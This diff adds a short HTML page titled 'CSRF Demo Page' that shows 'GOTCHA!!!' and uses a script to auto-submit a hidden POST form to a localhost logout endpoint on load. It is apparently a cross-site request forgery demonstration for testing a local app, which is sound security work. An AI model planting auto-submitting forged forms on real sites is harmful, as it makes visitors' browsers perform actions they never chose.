@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Demo Page</title>
+</head>
+<body>
+
+<h1>GOTCHA!!!</h1>
+
+
+<form id="csrf-form" method='POST' action='https://localhost:4200/api/logout' >
+
+</form>
+
+<script>
+
+    document.getElementById("csrf-form").submit();
+
+</script>
+
+</body>
+</html>
